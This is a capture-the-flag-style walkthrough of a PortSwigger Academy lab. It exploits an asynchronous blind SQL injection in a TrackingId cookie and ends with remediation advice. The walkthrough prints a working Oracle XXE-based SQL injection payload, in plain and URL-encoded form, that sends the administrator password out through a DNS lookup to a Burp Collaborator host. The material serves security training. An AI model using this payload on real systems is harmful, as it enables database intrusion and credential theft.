# PortSwigger Lab: Blind SQL Injection with Out-of-Band Data Exfiltration

**Difficulty:** Practitioner
**Target:** PortSwigger Web Security Academy

## Objective

The goal of this lab is to exploit an asynchronous blind SQL injection vulnerability in the `TrackingId` analytics cookie. Because the query executes asynchronously, we cannot use in-band output, conditional responses, error messages, or time delays. Instead, we must leverage Out-of-Band Application Security Testing (OAST) techniques to exfiltrate the `administrator` password from the `users` table via a DNS lookup to **Burp Collaborator**, and then log into their account.

## The Vulnerability Concept

Once an attacker confirms that a database is vulnerable to out-of-band SQL injection (such as via Oracle's `EXTRACTVALUE()` and `xmltype` XML External Entity resolution), they can upgrade the attack from simple interaction detection to full **data exfiltration**. 

By concatenating (`||`) the result of a SQL subquery—such as `(SELECT password FROM users WHERE username='administrator')`—directly as a subdomain prefix onto the attacker's Burp Collaborator domain inside the external entity URL, the database evaluates the subquery first and then attempts to resolve the dynamically constructed hostname (`<password>.<collaborator-domain>`). When the DNS lookup reaches the Burp Collaborator server, the plaintext password is leaked directly inside the captured DNS query log.

## Step-by-Step Exploitation

### 1. Reconnaissance & Traffic Interception

I started by reviewing the lab instructions, which noted that the `TrackingId` cookie is processed asynchronously and that our objective is to exfiltrate the `administrator` password from the `users` table using Burp Collaborator.

![Lab Description](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Lab%20Description.png)

Next, I launched the lab environment and browsed the main e-commerce storefront to generate standard HTTP traffic.

![Storefront Home](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Storefront%20Home.png)

Opening Burp Suite Professional, I navigated to the **Proxy -> HTTP history** tab and located the initial `GET /` request containing the `TrackingId` cookie (`TrackingId=LY8Z5M2Rv8PnYCsv`).

![Proxy HTTP History](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Proxy%20HTTP%20History.png)

I sent this request over to **Burp Repeater** so I could manipulate the `TrackingId` cookie and inject our out-of-band data exfiltration payload.

![Sending Request to Repeater](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Sending%20Request%20to%20Repeater.png)

### 2. Generating a Burp Collaborator Payload

To capture the exfiltrated data over DNS, I switched to the **Collaborator** tab in Burp Suite Professional and clicked **Copy to clipboard** to generate a unique Collaborator server address (`5djm4iuv5zbsf30ouw6jshp8qzwqkg85.oastify.com`).

![Generating Burp Collaborator Payload](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Generating%20Burp%20Collaborator%20Payload.png)

### 3. Crafting & Injecting the OAST Data Exfiltration Payload

Building upon the Oracle `EXTRACTVALUE()` XXE technique from the previous lab, I modified the external entity URL to prepend the result of a subquery fetching the administrator's password (`SELECT password FROM users WHERE username='administrator'`) as a subdomain of my Collaborator address using string concatenation (`||`):

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.5djm4iuv5zbsf30ouw6jshp8qzwqkg85.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

After URL-encoding key characters (`+` for spaces, `%3f` for `?`, `%3d` for `=`, `%25` for `%`, and `%3b` for `;`) so they wouldn't break the HTTP cookie header syntax, I appended the payload to the `TrackingId` cookie in **Burp Repeater**:

`TrackingId=LY8Z5M2Rv8PnYCsv'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.5djm4iuv5zbsf30ouw6jshp8qzwqkg85.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Sending the request returned an `HTTP/2 200 OK` response in `292 millis`.

![Injecting OAST Exfiltration Payload in Repeater](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Injecting%20OAST%20Exfiltration%20Payload%20in%20Repeater.png)

### 4. Capturing the Leaked Password in Burp Collaborator

Switching back to the **Collaborator** tab, I inspected the incoming DNS and HTTP interactions. Selecting one of the **DNS** lookups revealed the full domain name queried by the database server in the **Description** pane:

`ud8kyaa2ox7qupombo6s.5djm4iuv5zbsf30ouw6jshp8qzwqkg85.oastify.com`

The subdomain prefix (`ud8kyaa2ox7qupombo6s`) is the exact plaintext password for the `administrator` account!

![Exfiltrated Password in Burp Collaborator DNS Lookup](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Exfiltrated%20Password%20in%20Burp%20Collaborator%20DNS%20Lookup.png)

### 5. Authentication & Verification

Armed with the exfiltrated password (`ud8kyaa2ox7qupombo6s`), I navigated to the `/login` page in the browser and entered the credentials for `administrator`.

![Logging in as Administrator](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Logging%20in%20as%20Administrator.png)

Upon submitting the form, the application authenticated the session, redirected me to the administrator's "My Account" dashboard, and displayed the **"Congratulations, you solved the lab!"** banner.

![Lab Solved Confirmation](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/Lab%20Solved%20Confirmation.png)

## Remediation

To prevent out-of-band SQL injection and data exfiltration, developers and system administrators should apply defense-in-depth:

1. **Use Parameterized Queries (Prepared Statements):** Ensure all database queries—including asynchronous background queries parsing cookies and headers—use parameterized statements so user input is strictly treated as literal data and cannot inject subqueries or invoke functions like `EXTRACTVALUE()`.
2. **Enforce Strict Egress Filtering:** Configure network firewalls so that database servers cannot initiate arbitrary outbound DNS or HTTP connections to external domains on the internet.
3. **Disable XML External Entities (XXE):** Harden database XML parsers (`xmltype`) by disabling external DTD and entity resolution.